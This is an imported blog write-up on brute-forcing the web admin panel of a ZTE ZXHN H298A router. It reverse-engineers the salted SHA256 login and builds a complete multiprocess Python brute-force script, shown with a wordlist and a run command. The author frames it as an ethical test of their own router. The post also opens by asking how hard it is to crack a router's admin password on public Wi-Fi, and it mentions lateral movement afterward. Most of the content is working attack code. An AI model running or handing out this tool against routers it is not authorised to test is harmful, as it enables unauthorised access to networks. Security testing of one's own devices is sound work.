---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-04-12_hack-zte-routers-admin-panel.md
original_filename: 2024-04-12_hack-zte-routers-admin-panel.md
title: Hack ZTE router's admin panel
category: documents
detected_topics:
- ssrf
- command-injection
- otp
- rate-limit
- automation-abuse
- cloud-security
tags:
- imported
- documents
- ssrf
- command-injection
- otp
- rate-limit
- automation-abuse
- cloud-security
language: en
raw_sha256: c1b83ab118ab40bcd29c50a08fb243f835a7d82a31597e0032db7991d20a4bcc
text_sha256: 5ad8725d1e9c8f7a81a3f5990fce60d4c9861949c9a79449735eea0ef77cc129
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: true
---

# Hack ZTE router's admin panel

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-04-12_hack-zte-routers-admin-panel.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, otp, rate-limit, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: True
- Raw SHA256: `c1b83ab118ab40bcd29c50a08fb243f835a7d82a31597e0032db7991d20a4bcc`
- Text SHA256: `5ad8725d1e9c8f7a81a3f5990fce60d4c9861949c9a79449735eea0ef77cc129`


## Content

---
title: "Hack ZTE router's admin panel"
url: "https://websec.nl/blog/hack-zte-routers-admin-panel-66190e773cc251453bda7a0c"
authors: ["Zhassulan Zhussupov"]
programs: ["ZTE"]
bugs: ["Bruteforce"]
publication_date: "2024-04-12"
added_date: "2024-08-14"
source: "pentester.land/writeups.json"
original_index: 342
scraped_via: "browseros"
---

# Hack ZTE router's admin panel

Let's say that you are connected to a public Wi-Fi. How difficult is it to crack the password to the admin panel of the router?

As an ethical hacker, I frequently investigate the complexities of network security in order to better understand potential vulnerabilities and strengthen cybersecurity measures. One yeara ago, I conducted an experiment to determine the security of my home router, a ZTE ZXHN H298A. Given the proliferation of public Wi-Fi networks and the growing reliance on routers for internet connectivity, understanding the possible hazards connected with these devices is critical for protecting against cyber threats.

In this experiment, I aimed to determine the vulnerability of my ZTE router's admin panel against password cracking efforts. While ethical hacking aims to uncover and repair security holes before they are exploited maliciously, it also educates and raises awareness about the significance of strong cybersecurity practices.

With the growth of public Wi-Fi networks, both individuals and companies rely on routers to ensure secure and smooth internet access. However, the security of these devices is frequently disregarded, making them susceptible to a variety of cyber attacks. By investigating the security posture of my own router, I hoped to provide light on the various dangers and vulnerabilities that users might encounter.

The ZTE ZXHN H298A router model is well-known for its dependability and performance. It includes an admin panel that can be accessed via a web interface, as do many routers on the market. This panel allows users to customize a variety of settings, including network parameters and security measures. However, the security of the admin panel is dependent on the strength of the password used to access it.

In this experiment, I used ethical hacking techniques to test the strength of the admin panel's password against cracking attempts. I hoped to discover any flaws in the router's security by recreating real-world circumstances and utilizing specialist tools and approaches.

I hope that this experiment will highlight the significance of having strong security measures to protect routers and other network devices from cyber assaults. By raising awareness about the vulnerabilities that exist in these devices, I aim to empower users to take proactive steps to secure their networks and safeguard their sensitive information.

So, I decided to conduct an experiment on my home router ZTE ZXHN H298A, it's looks like this:

So, let's take a look at the admin panel. Run command:

ip a

Given that my IP address is 192.168.1.49, I'm willing to assume that the admin control panel is accessible at http://192.168.1.1:

Let's go to open Web Developer Tools at Firefox and try to login as admin:admin:

We got at error as expected, since password is wrong.

Let's look at the login logic:

As you can see, in addition to username (Username) and password (Password) parameters, we have parameters action (action=login) and session token (_sessionToken=906996931857070055384853). and the password is transmitted as a hash.

If we open inspector we can see javascript functions, even login function:

As you can see:

var SHA256Password=***REDACTED*** + xmlObj);

and:

LoginFormObj.addParameter("_sessionTOKEN", "277758823860570164419205");

And when we click login button:

I made a couple of requests to the address specified in the function:

curl -XGET http://192.168.1.1/function_module/login_module/login_page/logintoken_lua.lua

As you can see, some parameter comes in response and I assumed that when logging in, instead of an open password, it sends SHA256 of password + this parameter. So, our python function to login is something like this:

import requests

def login(username, pswd):
  url = "http://192.168.1.1"
  headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
  s = requests.Session()
  r = s.get(url, headers = headers)
  if r.ok:
  page = r.text
  token_idx = page.find('addParameter("_sessionTOKEN", "')
  token = r.text[token_idx+31:token_idx + 55]

  params = {
  "Username" : username,
  "Password" : pswd,
  "action" : "login",
  "_sessionTOKEN" : token,
  }

  s.post(url, headers = headers, data = params)

but we have to send the hash of password with "salt" instead of password.

Let's request an xml parameter:

import re

def get_xml_param():
  url = "http://192.168.1.1/function_module/login_module/login_page/logintoken_lua.lua"
  headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
  r = requests.get(url, headers = headers)
  if r.ok:
  xml = re.sub('[^0-9,]', "", r.text)
  return xml
  return None

Then create function for hashing our params:

import hashlib

def passwd_to_sha256(pswd, xml):
  h = hashlib.sha256(f"{pswd}{xml}".encode('utf-8')).hexdigest()
  return h

So we need to update our login function:

def login(username, pswd):
  url = "http://192.168.1.1"
  headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
  s = requests.Session()
  r = s.get(url, headers = headers)
  if r.ok:
  page = r.text
  token_idx = page.find('addParameter("_sessionTOKEN", "')
  token = r.text[token_idx+31:token_idx + 55]

  xml = get_xml_param()
  pswd = passwd_to_sha256(pswd, xml)

  params = {
  "Username" : username,
  "Password" : pswd,
  "action" : "login",
  "_sessionTOKEN" : token,
  }

  s.post(url, headers = headers, data = params)

So, our final version of the login script is something like this:

import requests
import re
import hashlib
import lxml.html

def login(username, pswd):
  url = "http://192.168.1.1"
  headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
  s = requests.Session()
  r = s.get(url, headers = headers)
  if r.ok:
  page = r.text
  token_idx = page.find('addParameter("_sessionTOKEN", "')
  token = r.text[token_idx+31:token_idx + 55]

  xml = get_xml_param()
  hashpswd = passwd_to_sha256(pswd, xml)

  params = {
  "Username" : username,
  "Password" : hashpswd,
  "action" : "login",
  "_sessionTOKEN" : token,
  }

  r = s.post(url, headers = headers, data = params)
  if r.ok:
  tree = lxml.html.fromstring(r.text)
  user_info = tree.xpath(".//div[contains(@id, 'logUser')]/@title")
  if user_info[0]:
  print (f"{username}:{pswd} successfully login, hacked :)")
  else:
  print (f"{username}:{pswd} - login failed :(")

def get_xml_param():
  url = "http://192.168.1.1/function_module/login_module/login_page/logintoken_lua.lua"
  headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
  r = requests.get(url, headers = headers)
  if r.ok:
  xml = re.sub('[^0-9,]', "", r.text)
  return xml
  return None

def passwd_to_sha256(pswd, xml):
  h = hashlib.sha256(f"{pswd}{xml}".encode('utf-8')).hexdigest()
  return h

Now let's add some brute force logic. Let's say we have wordlist file and we want to brute ZTE admin panel. So we will add another function:

def brute(username, wordlist):
  pool = mp.Pool(4)
  jobs = []
  with open(wordlist) as fp:
  for pswd in fp:
  jobs.append(pool.apply_async(login, (username, pswd)))
  for job in jobs:
  job.get()
  pool.close()

Ok, but there is one more caveat:

So, for the purity of experiment, I added a timeout:

time.sleep(240)

So the full source code is:

import requests
import re
import hashlib
import argparse
import lxml.html
import time
import multiprocessing as mp

class Colors:
  HEADER = '\033[95m'
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  RED = '\033[91m'
  PURPLE = '\033[95m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

def login(username, pswd):
  url = "http://192.168.1.1"
  headers = {
  'Accept' : '*/*',
  'Accept-Language' : "en-US,en;q=0.5",
  'Cache-Control' : 'max-age=0',
  'Connection' : 'keep-alive',
  "Host" : '192.168.1.1',
  "Referer" : url, 
  "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
  }
  s = requests.Session()
  r = s.get(url, headers = headers)
  if r.ok:
  page = r.text
  token_idx = page.find('addParameter("_sessionTOKEN", "')
  token = r.text[token_idx+31:token_idx + 55]

  xml = get_xml_param()
  hashpswd = passwd_to_sha256(pswd, xml)

  params = {
  "Username" : username,
  "Password" : hashpswd,
  "action" : "login",
  "_sessionTOKEN" : token,
  }

  r = s.post(url, headers = headers, data = params)
  if r.ok:
  with open("test.html", "w") as t:
  t.write(r.text)
  tree = lxml.html.fromstring(r.text)
  user_info = tree.xpath(".//div[contains(@id, 'logUser')]/@title")
  if user_info[0]:
  print (Colors.GREEN + f"{username}:{pswd} successfully login, hacked :)" + Colors.ENDC)
  else:
  print (Colors.RED + f"{username}:{pswd} - login failed :(" + Colors.ENDC)
  time.sleep(200)

def get_xml_param():
  url = "http://192.168.1.1/function_module/login_module/login_page/logintoken_lua.lua"
  headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
  r = requests.get(url, headers = headers)
  if r.ok:
  xml = re.sub('[^0-9,]', "", r.text)
  return xml
  return None

def passwd_to_sha256(pswd, xml):
  h = hashlib.sha256(f"{pswd}{xml}".encode('utf-8')).hexdigest()
  return h

def brute(username, wordlist):
  print (Colors.BLUE + "start brute..." + Colors.ENDC)
  pool = mp.Pool(4)
  jobs = []
  with open(wordlist) as fp:
  for pswd in fp:
  jobs.append(pool.apply_async(login, (username, pswd.replace("\n", "").strip())))
  for job in jobs:
  job.get()
  pool.close()
  print (Colors.BLUE + "finish brute..." + Colors.ENDC)

if __name__ == "__main__":
  parser = argparse.ArgumentParser()
  parser.add_argument('-u','--uname', required = True, help = "username", default = 'admin')
  parser.add_argument('-w','--wordlist', required = True, help = "wordlist file")
  args = vars(parser.parse_args())
  brute(args['uname'], args['wordlist'])

demo

Let's go to see everything in action. First of all, create wordlist file:

admin
12345
password
Rh8Rw838@1
pa$$w0rd
qwerty
12345678

For simplicity it's a little file with my ZTE router's admin panel password. Run:

python3 zte_hack.py -u admin -w ./wordlist.txt

As you can see, everything is work perfectly!

Undoubtedly, one could replicate this experiment across a myriad of router models, each potentially susceptible to brute force attacks or even more sophisticated vulnerabilities. The aim is to illustrate that with basic proficiency in Python scripting, one can develop a tool to assess the security of their home network devices. This serves to underscore the broader significance of proactive cybersecurity measures in safeguarding against potential threats and vulnerabilities in network infrastructure.

Of course, with real sophisticated attacks, it’s not enough just to hack the router, but you also need lateral movement and pivot to other internal networks and go on.

This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!
PS. All drawings and screenshots are mine
